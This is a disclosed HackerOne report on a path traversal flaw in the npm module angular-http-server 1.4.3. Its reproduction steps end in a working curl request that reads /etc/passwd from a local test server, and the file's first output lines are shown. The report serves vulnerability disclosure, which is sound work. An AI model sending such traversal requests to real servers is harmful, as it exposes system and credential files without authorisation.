# [H] [angular-http-server] Server Directory Traversal

## Summary
Severity: High (CVSS 8.6)
Program: Node.js third-party modules
Weakness: Path Traversal
Reporter: tungpun
State: resolved
Disclosed: 2018-04-26T05:42:34.174Z
Source: https://hackerone.com/reports/330349

## Details
I would like to report a Server Directory Traversal vulnerability in angular-http-server.
It allows reading local files on the target server.

# Module

**module name:** angular-http-server
**version:** 1.4.3
**npm page:** `https://www.npmjs.com/package/angular-http-server`

## Module Description

A very simple application server designed for Single Page App (SPA) developers.

It returns a file to the browser if it exists (ex. your-icon.png, index.html) and if can't find a file that matches a given URL it re-directs you to index.html rather than giving a 404 error. The only time it will error out is if it can't locate the index.html file.

Originally designed for my Angular work, this server will work with any Single Page App (SPA) framework that uses a router to change the URL (React, Vue JS, Elm,...).

## Steps To Reproduce:

* Install the module:

`$ npm i angular-http-server`

* Create the index file:

`$ echo "hi" > index.html`

* Start the server:

`$ ./node_modules/angular-http-server/angular-http-server.js -p 6060`

* Using the below request to access the file `/etc/passwd` on the target server:

```
$ curl --path-as-is 'http://127.0.0.1:6060//etc/passwd'

##
# User Database
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/330349_
